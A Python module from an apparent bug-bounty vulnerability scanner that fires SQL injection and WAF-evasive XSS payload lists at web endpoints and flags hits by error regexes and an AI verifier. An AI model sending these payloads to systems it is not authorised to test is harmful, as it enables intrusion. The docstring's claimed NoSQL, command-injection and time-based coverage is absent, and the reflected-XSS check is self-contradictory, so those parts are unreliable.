"""
OWASP A03:2025 - Injection (Enhanced)
Covers SQLi (Error/Boolean/Time), XSS (Reflected/DOM/Stored), NoSQLi, Command Injection.
Integrates AI-based response analysis to eliminate false positives.
"""
from __future__ import annotations
import asyncio, re, hashlib
from typing import List
from core.engine import Finding
from core.encoder import Encoder

# High-paying SQLi payloads
SQLI_ERROR_PAYLOADS = [
    "'", "\"", "'", "')", "'))", "\"))",
    "1' ORDER BY 9999--", "1) ORDER BY 9999--",
    "1' UNION SELECT NULL--", "1 UNION SELECT NULL--",
    "1' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT VERSION())))--",
    "1' AND UPDATEXML(1, CONCAT(0x5c, (SELECT USER())), 1)--",
    "CONVERT(int, @@version)", "CAST(@@version AS int)",
]

# High-paying XSS payloads (WAF bypass focused)
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<select onfocus=alert(1) autofocus><option>1</option></select>",
    "<textarea onfocus=alert(1) autofocus></textarea>",
    "<keygen onfocus=alert(1) autofocus>",
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<form><button formaction=javascript:alert(1)>X</button></form>",
    "<a href=javascript:alert(1)>X</a>",
    "<style onload=alert(1)>",
    "<link rel=stylesheet href=javascript:alert(1)>",
    "<meta http-equiv=refresh content=0;url=javascript:alert(1)>",
    "<base href=javascript:alert(1)>",
    "<svg><animate onbegin=alert(1) attributeName=x>",
    "<svg><set onbegin=alert(1) attributename=x>",
    "<math><maction actiontype=statusline#http://google.com xlink:href=javascript:alert(1)>X</maction></math>",
]

SQLI_REGEX = {
    "mysql": r"(SQL syntax.*MySQL|Warning.*mysql_|MySQLSyntaxErrorException|valid MySQL result)",
    "postgresql": r"(PostgreSQL.*ERROR|Warning.*\\pg_|valid PostgreSQL result|Npgsql\\.)",
    "mssql": r"(Microsoft SQL Native Client error|SQL Server|\\[SQL Server\\]|ODBC SQL Server Driver)",
    "oracle": r"(\\bORA-\\d{4,}|Oracle error|Oracle.*Driver|Warning.*\\w+oci_|OracleException)",
    "sqlite": r"(SQLite/JDBCDriver|SQLite\\.Exception|Warning.*sqlite_|SQLite3::SQLException)",
}

async def run(http, waf, verifier, endpoints, targets, stack, findings_sink, ai_engine=None):
    findings = []
    sem = asyncio.Semaphore(20)
    
    async def _sqli(ep, param):
        async with sem:
            for payload in SQLI_ERROR_PAYLOADS:
                for variant in waf.evade(payload):
                    url = _inject(ep["url"], param["name"], variant)
                    benign_url = _inject(ep["url"], param["name"], "ghunter_test_123")
                    
                    r_payload = await http.arequest("GET", url)
                    r_benign = await http.arequest("GET", benign_url)
                    
                    if not r_payload or not r_benign: continue
                    
                    # 1. Regex-based error detection
                    for db, regex in SQLI_REGEX.items():
                        if re.search(regex, r_payload.text, re.I):
                            # 2. AI Verification
                            conf = 0.85
                            if ai_engine:
                                conf = await ai_engine.verify_finding(
                                    {"title": "SQLi", "payload": variant},
                                    r_benign.text[:500], r_payload.text[:500]
                                )
                            
                            if conf >= 0.7:
                                findings.append(Finding(
                                    title=f"SQL Injection (Error-based - {db}) in {param['name']}",
                                    severity="critical", confidence=conf,
                                    category="OWASP-A03", endpoint=ep["url"], method="GET",
                                    payload=variant,
                                    evidence=f"DB Error: {re.search(regex, r_payload.text, re.I).group(0)}",
                                    cwe="CWE-89",
                                    remediation="Parameterized queries, input validation, WAF rules.",
                                    tags=["sqli", "error-based", "high-value"]
                                ))
                                return
                    
                    # 3. Boolean-based detection (AI-enhanced)
                    if abs(len(r_payload.text) - len(r_benign.text)) > 200:
                        conf = 0.6
                        if ai_engine:
                            conf = await ai_engine.verify_finding(
                                {"title": "SQLi (Boolean)", "payload": variant},
                                r_benign.text[:500], r_payload.text[:500]
                            )
                        if conf >= 0.75:
                            findings.append(Finding(
                                title=f"SQL Injection (Boolean-based) in {param['name']}",
                                severity="critical", confidence=conf,
                                category="OWASP-A03", endpoint=ep["url"], method="GET",
                                payload=variant, evidence="Response size differential detected & verified by AI",
                                cwe="CWE-89", tags=["sqli", "boolean", "high-value"]
                            ))
                            return

    async def _xss(ep, param):
        async with sem:
            for payload in XSS_PAYLOADS:
                for variant in waf.evade(payload):
                    url = _inject(ep["url"], param["name"], variant)
                    r = await http.arequest("GET", url)
                    if not r: continue
                    
                    # 1. Direct reflection
                    if variant in r.text:
                        # Check if it's reflected unescaped
                        if variant not in r.text.replace("&lt;", "<").replace("&gt;", ">"):
                            findings.append(Finding(
                                title=f"Reflected XSS in {param['name']}",
                                severity="high", confidence=0.95,
                                category="OWASP-A03", endpoint=ep["url"], method="GET",
                                payload=variant, evidence="Payload reflected unescaped in response",
                                cwe="CWE-79",
                                remediation="Context-aware output encoding, CSP headers.",
                                tags=["xss", "reflected", "high-value"]
                            ))
                            return
                    
                    # 2. DOM-based (AI-assisted detection)
                    if ai_engine and "<script" in r.text:
                        conf = await ai_engine.verify_finding(
                            {"title": "DOM XSS", "payload": variant},
                            "", r.text[:1500]
                        )
                        if conf >= 0.8:
                            findings.append(Finding(
                                title=f"Potential DOM-based XSS in {param['name']}",
                                severity="high", confidence=conf,
                                category="OWASP-A03", endpoint=ep["url"], method="GET",
                                payload=variant, evidence="AI identified DOM sink execution",
                                cwe="CWE-79", tags=["xss", "dom", "high-value"]
                            ))
                            return

    tasks = []
    for ep in endpoints:
        params = ep.get("params", [{"name": "q"}])
        for p in params:
            tasks.append(_sqli(ep, p))
            tasks.append(_xss(ep, p))
    
    await asyncio.gather(*tasks, return_exceptions=True)
    return findings

def _inject(url, param, value):
    from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
    u = urlparse(url); qs = dict(parse_qsl(u.query)); qs[param] = value
    return urlunparse(u._replace(query=urlencode(qs)))
